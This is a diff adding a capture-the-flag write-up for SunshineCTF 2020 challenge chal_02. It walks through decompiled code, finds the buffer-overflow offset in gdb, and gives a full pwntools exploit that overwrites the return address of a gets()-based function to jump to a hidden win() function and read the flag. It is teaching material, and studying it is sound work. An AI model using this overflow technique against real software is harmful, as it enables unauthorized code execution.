@@ -218,3 +218,123 @@ $ cat flag.txt
 sun{eternal-rest-6a5ee49d943a053a}
 $  
 ```
+
+## chal_02
+---
+The decompilation output is pretty different this time around. Let's take a look.
+
+```c
+void main(void)
+
+{
+  char local_24 [20];
+  undefined *local_10;
+  
+  local_10 = &stack0x00000004;
+  puts("Went along the mountain side.");
+  fgets(local_24,0x13,stdin);
+  vuln();
+  return;
+}
+```
+
+There's a call to another method. Let's inspect `vuln()` as well:
+
+```c
+void vuln(void)
+
+{
+  char local_3e [54];
+  
+  __x86.get_pc_thunk.ax();
+  gets(local_3e);
+  return;
+}
+```
+
+There is no direct way to gain shell access by these two functions. Looking around a bit more, we can see that there is a third function that never gets called:
+
+```c
+void win(void)
+
+{
+  int iVar1;
+  
+  iVar1 = __x86.get_pc_thunk.ax();
+  system((char *)(iVar1 + 0x12e));
+  return;
+}
+```
+
+Looks promising. 
+
+The `vuln()` function is still using `gets()`. We will be able to overwrite the return address of the function with the address of `win()`.
+
+The quick way to find what size input we need to overwrite the return address is to call the program with the alphabet string and run it in a debugger:
+
+```sh
+(gdb) r 
+Starting program: /mnt/c/Users/meraxes/dev/ctf/sunshine-ctf-2020/chall_02 
+Went along the mountain side.
+throwaway
+AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ
+
+Program received signal SIGSEGV, Segmentation fault.
+0x51515050 in ?? ()
+```
+
+As expected, the program crashed from trying to jump to a return address that didn't make sense. The program crashed at address `0x51515050`. Hex 51 is Q and hex 50 is P. (Remember this is little endian, which is why the results seem reversed). Now we know that the payload needs to start after 2 Ps in the string.
+
+The place we want to get to is the address of the win function:
+
+```assembly
+(gdb) disassemble win
+Dump of assembler code for function win:
+   0x080484d6 <+0>:     push   %ebp
+   ...
+```
+
+Full exploit:
+
+```python
+#!/usr/bin/env python3
+
+from pwn import *
+
+context.binary = ELF('./chall_02')
+
+if args.REMOTE:
+    io = remote('chal.2020.sunshinectf.org', 30002)
+else:
+    io = process(context.binary.path)
+
+print(io.recvline())
+io.sendline('throwaway')
+
+buffer = 'AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPP'
+payload = p32(0x080484d6) # address of win function
+exploit = flat(buffer, payload)
+
+
+print("Sending: ", exploit)
+io.sendline(exploit)
+
+io.interactive()
+```
+
+Output:
+```sh
+meraxes@pantheon:/mnt/c/Users/meraxes/dev/ctf/sunshine-ctf-2020$ ./chall_02.py REMOTE
+[*] '/mnt/c/Users/meraxes/dev/ctf/sunshine-ctf-2020/chall_02'
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x8048000)
+[+] Opening connection to chal.2020.sunshinectf.org on port 30002: Done
+b'Went along the mountain side.\n'
+Sending:  b'AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPP\xd6\x84\x04\x08'
+[*] Switching to interactive mode
+$ cat flag.txt
+sun{warmness-on-the-soul-3b6aad1d8bb54732}
+```
